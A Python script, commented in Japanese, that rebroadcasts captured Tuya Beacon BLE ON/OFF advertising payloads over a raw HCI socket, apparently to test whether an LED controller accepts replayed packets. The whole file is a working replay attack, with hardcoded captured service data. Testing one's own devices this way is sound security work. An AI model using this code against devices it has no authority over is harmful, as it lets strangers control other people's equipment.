"""Tuya Beacon BLE 広告パケット再送スクリプト。

キャプチャした ON/OFF の Service Data を ADV_NONCONN_IND で再送し、
LED コントローラーの応答をテストする（リプレイ攻撃テスト）。

実行環境:
    Linux（Raspberry Pi OS）のみ対応。

実行要件:
    - sudo 権限（raw HCI ソケット使用のため）
    - 事前に bluetoothd を停止: sudo systemctl stop bluetooth

使い方:
    sudo uv run python src/ble_sender/send_adv.py on
    sudo uv run python src/ble_sender/send_adv.py off
    sudo uv run python src/ble_sender/send_adv.py on --duration 3.0
    sudo uv run python src/ble_sender/send_adv.py off --device 1
"""

import argparse
import contextlib
import os
import socket
import struct
import sys
import time

# Linux 専用 Bluetooth ソケット定数（他プラットフォームでは main() 冒頭で終了するため実行されない）
_AF_BLUETOOTH: int = getattr(socket, 'AF_BLUETOOTH', 31)
_BTPROTO_HCI: int = getattr(socket, 'BTPROTO_HCI', 1)

# HCI パケット種別
_HCI_COMMAND_PKT: int = 0x01

# LE コントローラコマンドの OGF (Opcode Group Field)
_OGF_LE: int = 0x08

# LE コマンドの OCF (Opcode Command Field)
_OCF_LE_SET_ADV_PARAMS: int = 0x0006
_OCF_LE_SET_ADV_DATA: int = 0x0008
_OCF_LE_SET_ADV_ENABLE: int = 0x000A

# BlueZ HCI ソケットオプション定数（linux/bluetooth/hci.h より）
_SOL_HCI: int = 0
_HCI_FILTER: int = 2

# Tuya UUID 0xFD50（BLE はリトルエンディアン）
_TUYA_UUID_LE: bytes = bytes([0x50, 0xFD])

# アドバタイズ間隔: 100ms（単位 0.625ms → 160 = 100ms）
_ADV_INTERVAL: int = 160

# キャプチャ済みの最新 Service Data（各ボタン最終押下分）
# ON: counter=0xf0（5回目）、OFF: counter=0xeb（5回目）
_SERVICE_DATA: dict[str, dict[str, str]] = {
    'on': {
        '60': '408060000001f02464ff13c2143a871a85dd5a00',
        '80': '408080000001f0db291b4aba46a28cf4fe177f00',
    },
    'off': {
        '60': '408060000001eb44b362c7d97ffc4c92a165b100',
        '80': '408080000001eb1784ca38b15e247ec5a7537700',
    },
}


def _build_adv_data(service_data: bytes) -> bytes:
    """31バイトの BLE アドバタイズデータを構築する。

    元デバイスのキャプチャと同一の AD 構造を再現する:
        AD1: Flags
        AD2: Incomplete List of 16-bit UUIDs (0xFD50)
        AD3: Service Data - 16-bit UUID (0xFD50 + 20バイトペイロード)

    Args:
        service_data: Tuya Beacon の 20 バイト Service Data。

    Returns:
        31 バイトの BLE アドバタイズデータ。
    """
    ad_flags = bytes([0x02, 0x01, 0x06])  # Flags: LE General Discoverable, BR/EDR Not Supported
    ad_uuid = bytes([0x03, 0x02]) + _TUYA_UUID_LE  # Incomplete List of 16-bit UUIDs: 0xFD50
    ad_svc = bytes([0x17, 0x16]) + _TUYA_UUID_LE + service_data  # Service Data: 0x17=length(23), 0x16=type
    return ad_flags + ad_uuid + ad_svc  # 3 + 4 + 24 = 31 bytes


class _HCISocket:
    """raw HCI ソケットの薄いラッパー。"""

    def __init__(self, dev_id: int = 0) -> None:
        """HCI ソケットを開いてデバイスにバインドする。

        Args:
            dev_id: HCI デバイス番号（hci0 → 0）。

        Raises:
            PermissionError: root 権限がない場合。
            OSError: Bluetooth デバイスが見つからない場合。
        """
        self._sock = socket.socket(_AF_BLUETOOTH, socket.SOCK_RAW, _BTPROTO_HCI)
        self._sock.bind((dev_id,))
        # 全 HCI イベントを受信するフィルタ（コマンド完了イベント消費用）
        flt = struct.pack('<IQH', 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0)
        self._sock.setsockopt(_SOL_HCI, _HCI_FILTER, flt)
        self._sock.settimeout(2.0)

    def send_cmd(self, ogf: int, ocf: int, params: bytes = b'') -> None:
        """HCI コマンドを送信してコマンド完了イベントを待機する。

        Args:
            ogf: Opcode Group Field。
            ocf: Opcode Command Field。
            params: コマンドパラメータ（省略時は空バイト列）。
        """
        opcode = (ogf << 10) | ocf
        pkt = struct.pack('<BHB', _HCI_COMMAND_PKT, opcode, len(params)) + params
        self._sock.send(pkt)
        with contextlib.suppress(TimeoutError):
            self._sock.recv(256)  # Command Complete Event を消費

    def close(self) -> None:
        """ソケットを閉じる。"""
        self._sock.close()

    def __enter__(self) -> '_HCISocket':
        """コンテキストマネージャ開始。"""
        return self

    def __exit__(self, *_: object) -> None:
        """コンテキストマネージャ終了時にソケットを閉じる。"""
        self.close()


def _le_set_adv_params(hci: _HCISocket) -> None:
    """LE アドバタイズパラメータを設定する（ADV_NONCONN_IND 固定）。

    Args:
        hci: HCI ソケット。
    """
    params = struct.pack(
        '<HHBBB6sBB',
        _ADV_INTERVAL,  # Advertising_Interval_Min
        _ADV_INTERVAL,  # Advertising_Interval_Max
        0x03,  # Advertising_Type: ADV_NONCONN_IND
        0x00,  # Own_Address_Type: public
        0x00,  # Peer_Address_Type: public
        b'\x00' * 6,  # Peer_Address（未使用）
        0x07,  # Advertising_Channel_Map: ch37/38/39 全チャネル
        0x00,  # Advertising_Filter_Policy
    )
    hci.send_cmd(_OGF_LE, _OCF_LE_SET_ADV_PARAMS, params)


def _le_set_adv_data(hci: _HCISocket, adv_data: bytes) -> None:
    """LE アドバタイズデータを設定する。

    Args:
        hci: HCI ソケット。
        adv_data: 最大 31 バイトのアドバタイズデータ。
    """
    # HCI 仕様: length(1byte) + data(31bytes固定、不足分は 0x00 埋め)
    params = bytes([len(adv_data)]) + adv_data.ljust(31, b'\x00')
    hci.send_cmd(_OGF_LE, _OCF_LE_SET_ADV_DATA, params)


def _le_set_adv_enable(hci: _HCISocket, *, enable: bool) -> None:
    """LE アドバタイズを有効または無効にする。

    Args:
        hci: HCI ソケット。
        enable: True で有効化、False で無効化。
    """
    hci.send_cmd(_OGF_LE, _OCF_LE_SET_ADV_ENABLE, bytes([0x01 if enable else 0x00]))


def _send_frame(hci: _HCISocket, service_data: bytes, duration: float) -> None:
    """指定フレームを duration 秒間アドバタイズする。

    Args:
        hci: HCI ソケット。
        service_data: 20 バイトの Service Data。
        duration: 送信継続時間（秒）。
    """
    _le_set_adv_data(hci, _build_adv_data(service_data))
    _le_set_adv_enable(hci, enable=True)
    try:
        time.sleep(duration)
    finally:
        _le_set_adv_enable(hci, enable=False)


def send_command(command: str, *, duration: float = 1.5, dev_id: int = 0) -> None:
    """ON または OFF コマンドを Tuya Beacon 広告パケットとして送信する。

    60 系フレームと 80 系フレームを duration 秒ずつ順に送信する。

    Args:
        command: 'on' または 'off'。
        duration: フレーム種別あたりの送信継続時間（秒）。デフォルト 1.5。
        dev_id: HCI デバイス番号（hci0=0）。デフォルト 0。

    Raises:
        PermissionError: root 権限がない場合。
        OSError: Bluetooth デバイスが利用できない場合。
        KeyboardInterrupt: Ctrl+C で中断した場合。
    """
    frames = _SERVICE_DATA[command]
    sd_60 = bytes.fromhex(frames['60'])
    sd_80 = bytes.fromhex(frames['80'])

    print(f'送信コマンド: {command.upper()}  (hci{dev_id}, 各フレーム {duration}s)')
    print(f'  60系: {frames["60"]}')
    print(f'  80系: {frames["80"]}')

    with _HCISocket(dev_id) as hci:
        _le_set_adv_params(hci)
        print('  [60系] 送信中...', end='', flush=True)
        _send_frame(hci, sd_60, duration)
        print(' 完了')
        print('  [80系] 送信中...', end='', flush=True)
        _send_frame(hci, sd_80, duration)
        print(' 完了')

    print('送信終了')


def main() -> None:
    """エントリーポイント。"""
    if sys.platform != 'linux':
        print('エラー: このスクリプトは Linux 上でのみ動作します', file=sys.stderr)
        sys.exit(1)

    get_euid = getattr(os, 'geteuid', None)
    if get_euid is not None and get_euid() != 0:
        print('エラー: root 権限が必要です。sudo で実行してください', file=sys.stderr)
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Tuya Beacon BLE リプレイ送信テスト',
        epilog='事前準備: sudo systemctl stop bluetooth',
    )
    parser.add_argument('command', choices=['on', 'off'], help='送信するコマンド')
    parser.add_argument('--duration', type=float, default=1.5, metavar='SEC', help='フレーム種別あたりの送信秒数（デフォルト: 1.5）')
    parser.add_argument('--device', type=int, default=0, metavar='N', help='HCI デバイス番号（デフォルト: 0）')
    args = parser.parse_args()

    try:
        send_command(args.command, duration=args.duration, dev_id=args.device)
    except PermissionError:
        print('エラー: BT デバイスへのアクセス権限がありません', file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f'エラー: Bluetooth デバイスを開けません ({e})', file=sys.stderr)
        print('ヒント: sudo systemctl stop bluetooth を実行後に再試行してください', file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print('\n中断しました')
        sys.exit(130)


if __name__ == '__main__':
    main()
